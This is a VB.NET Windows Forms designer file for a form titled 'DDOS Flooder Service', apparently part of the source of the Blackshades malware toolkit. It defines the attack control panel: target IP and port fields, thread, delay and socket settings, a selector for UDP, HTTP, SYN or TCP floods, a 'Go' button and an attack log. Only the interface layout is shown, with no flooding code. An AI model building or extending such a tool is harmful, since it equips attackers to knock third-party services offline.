﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form14
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.BlackShadesNetForm1 = New Blackshades.BlackShadesNetForm()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.attsock = New System.Windows.Forms.TextBox()
        Me.atttime = New System.Windows.Forms.TextBox()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.attthrd = New System.Windows.Forms.TextBox()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.attip = New System.Windows.Forms.TextBox()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.attport = New System.Windows.Forms.TextBox()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.strtbutt = New System.Windows.Forms.Button()
        Me.label14 = New System.Windows.Forms.Label()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Ddosbar = New System.Windows.Forms.TrackBar()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.attlog = New System.Windows.Forms.TextBox()
        Me.BlackShadesNetForm1.SuspendLayout()
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        CType(Me.Ddosbar, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage3.SuspendLayout()
        Me.SuspendLayout()
        '
        'BlackShadesNetForm1
        '
        Me.BlackShadesNetForm1.CloseButtonExitsApp = False
        Me.BlackShadesNetForm1.Controls.Add(Me.TabControl1)
        Me.BlackShadesNetForm1.Controls.Add(Me.Panel1)
        Me.BlackShadesNetForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.BlackShadesNetForm1.Font = New System.Drawing.Font("Trebuchet MS", 8.25!, System.Drawing.FontStyle.Bold)
        Me.BlackShadesNetForm1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(142, Byte), Integer), CType(CType(152, Byte), Integer), CType(CType(156, Byte), Integer))
        Me.BlackShadesNetForm1.Location = New System.Drawing.Point(0, 0)
        Me.BlackShadesNetForm1.MinimizeButton = True
        Me.BlackShadesNetForm1.Name = "BlackShadesNetForm1"
        Me.BlackShadesNetForm1.Size = New System.Drawing.Size(472, 203)
        Me.BlackShadesNetForm1.TabIndex = 0
        Me.BlackShadesNetForm1.Text = "DDOS Flooder Service"
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.Transparent
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(472, 27)
        Me.Panel1.TabIndex = 2
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Controls.Add(Me.TabPage3)
        Me.TabControl1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl1.Location = New System.Drawing.Point(0, 27)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(472, 176)
        Me.TabControl1.TabIndex = 33
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.GroupBox2)
        Me.TabPage1.Controls.Add(Me.GroupBox1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 25)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(464, 147)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Main"
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.attsock)
        Me.GroupBox2.Controls.Add(Me.atttime)
        Me.GroupBox2.Controls.Add(Me.Label19)
        Me.GroupBox2.Controls.Add(Me.Label17)
        Me.GroupBox2.Controls.Add(Me.attthrd)
        Me.GroupBox2.Controls.Add(Me.Label18)
        Me.GroupBox2.Location = New System.Drawing.Point(221, 16)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(231, 108)
        Me.GroupBox2.TabIndex = 33
        Me.GroupBox2.TabStop = False
        '
        'attsock
        '
        Me.attsock.BackColor = System.Drawing.Color.White
        Me.attsock.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.attsock.ForeColor = System.Drawing.Color.ForestGreen
        Me.attsock.Location = New System.Drawing.Point(74, 78)
        Me.attsock.Name = "attsock"
        Me.attsock.Size = New System.Drawing.Size(77, 20)
        Me.attsock.TabIndex = 30
        '
        'atttime
        '
        Me.atttime.BackColor = System.Drawing.Color.White
        Me.atttime.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.atttime.ForeColor = System.Drawing.Color.ForestGreen
        Me.atttime.Location = New System.Drawing.Point(128, 36)
        Me.atttime.Name = "atttime"
        Me.atttime.Size = New System.Drawing.Size(77, 20)
        Me.atttime.TabIndex = 27
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Location = New System.Drawing.Point(71, 62)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(109, 16)
        Me.Label19.TabIndex = 31
        Me.Label19.Text = "Number of sockets"
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Location = New System.Drawing.Point(125, 20)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(63, 16)
        Me.Label17.TabIndex = 26
        Me.Label17.Text = "Delay (ms)"
        '
        'attthrd
        '
        Me.attthrd.BackColor = System.Drawing.Color.White
        Me.attthrd.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.attthrd.ForeColor = System.Drawing.Color.ForestGreen
        Me.attthrd.Location = New System.Drawing.Point(6, 36)
        Me.attthrd.Name = "attthrd"
        Me.attthrd.Size = New System.Drawing.Size(77, 20)
        Me.attthrd.TabIndex = 28
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Location = New System.Drawing.Point(3, 20)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(108, 16)
        Me.Label18.TabIndex = 29
        Me.Label18.Text = "Number of threads"
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.attip)
        Me.GroupBox1.Controls.Add(Me.Label20)
        Me.GroupBox1.Controls.Add(Me.attport)
        Me.GroupBox1.Controls.Add(Me.Label15)
        Me.GroupBox1.Location = New System.Drawing.Point(6, 16)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(209, 65)
        Me.GroupBox1.TabIndex = 32
        Me.GroupBox1.TabStop = False
        '
        'attip
        '
        Me.attip.BackColor = System.Drawing.Color.White
        Me.attip.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.attip.ForeColor = System.Drawing.Color.ForestGreen
        Me.attip.Location = New System.Drawing.Point(8, 36)
        Me.attip.Name = "attip"
        Me.attip.Size = New System.Drawing.Size(112, 20)
        Me.attip.TabIndex = 22
        '
        'Label20
        '
        Me.Label20.AutoSize = True
        Me.Label20.Location = New System.Drawing.Point(126, 20)
        Me.Label20.Name = "Label20"
        Me.Label20.Size = New System.Drawing.Size(29, 16)
        Me.Label20.TabIndex = 24
        Me.Label20.Text = "Port"
        '
        'attport
        '
        Me.attport.BackColor = System.Drawing.Color.White
        Me.attport.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.attport.ForeColor = System.Drawing.Color.ForestGreen
        Me.attport.Location = New System.Drawing.Point(126, 36)
        Me.attport.Name = "attport"
        Me.attport.Size = New System.Drawing.Size(77, 20)
        Me.attport.TabIndex = 25
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.Location = New System.Drawing.Point(8, 20)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(17, 16)
        Me.Label15.TabIndex = 23
        Me.Label15.Text = "IP"
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.strtbutt)
        Me.TabPage2.Controls.Add(Me.label14)
        Me.TabPage2.Controls.Add(Me.Label13)
        Me.TabPage2.Controls.Add(Me.Label12)
        Me.TabPage2.Controls.Add(Me.Label11)
        Me.TabPage2.Controls.Add(Me.Label10)
        Me.TabPage2.Controls.Add(Me.Ddosbar)
        Me.TabPage2.Location = New System.Drawing.Point(4, 25)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(464, 147)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Flood"
        '
        'strtbutt
        '
        Me.strtbutt.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.strtbutt.Location = New System.Drawing.Point(8, 101)
        Me.strtbutt.Name = "strtbutt"
        Me.strtbutt.Size = New System.Drawing.Size(447, 23)
        Me.strtbutt.TabIndex = 28
        Me.strtbutt.Text = "Go"
        Me.strtbutt.UseVisualStyleBackColor = True
        '
        'label14
        '
        Me.label14.AutoSize = True
        Me.label14.Location = New System.Drawing.Point(354, 62)
        Me.label14.Name = "label14"
        Me.label14.Size = New System.Drawing.Size(28, 16)
        Me.label14.TabIndex = 27
        Me.label14.Text = "TCP"
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Location = New System.Drawing.Point(262, 62)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(29, 16)
        Me.Label13.TabIndex = 26
        Me.Label13.Text = "SYN"
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Location = New System.Drawing.Point(168, 62)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(36, 16)
        Me.Label12.TabIndex = 25
        Me.Label12.Text = "HTTP"
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Location = New System.Drawing.Point(80, 62)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(28, 16)
        Me.Label11.TabIndex = 24
        Me.Label11.Text = "UDP"
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(178, 14)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(111, 16)
        Me.Label10.TabIndex = 23
        Me.Label10.Text = "Choose Flood Type"
        '
        'Ddosbar
        '
        Me.Ddosbar.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.Ddosbar.Location = New System.Drawing.Point(82, 30)
        Me.Ddosbar.Maximum = 4
        Me.Ddosbar.Minimum = 1
        Me.Ddosbar.Name = "Ddosbar"
        Me.Ddosbar.Size = New System.Drawing.Size(298, 45)
        Me.Ddosbar.TabIndex = 22
        Me.Ddosbar.Value = 1
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.attlog)
        Me.TabPage3.Location = New System.Drawing.Point(4, 25)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(464, 147)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Log"
        '
        'attlog
        '
        Me.attlog.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.attlog.ForeColor = System.Drawing.Color.Lime
        Me.attlog.Location = New System.Drawing.Point(4, 3)
        Me.attlog.Multiline = True
        Me.attlog.Name = "attlog"
        Me.attlog.ReadOnly = True
        Me.attlog.Size = New System.Drawing.Size(455, 124)
        Me.attlog.TabIndex = 14
        '
        'Form14
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(472, 203)
        Me.Controls.Add(Me.BlackShadesNetForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "Form14"
        Me.Text = "DDOS Flooder Service"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.BlackShadesNetForm1.ResumeLayout(False)
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        CType(Me.Ddosbar, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents BlackShadesNetForm1 As Blackshades.BlackShadesNetForm
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents attsock As System.Windows.Forms.TextBox
    Friend WithEvents atttime As System.Windows.Forms.TextBox
    Friend WithEvents Label19 As System.Windows.Forms.Label
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents attthrd As System.Windows.Forms.TextBox
    Friend WithEvents Label18 As System.Windows.Forms.Label
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents attip As System.Windows.Forms.TextBox
    Friend WithEvents Label20 As System.Windows.Forms.Label
    Friend WithEvents attport As System.Windows.Forms.TextBox
    Friend WithEvents Label15 As System.Windows.Forms.Label
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents strtbutt As System.Windows.Forms.Button
    Friend WithEvents label14 As System.Windows.Forms.Label
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents Ddosbar As System.Windows.Forms.TrackBar
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents attlog As System.Windows.Forms.TextBox
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
End Class
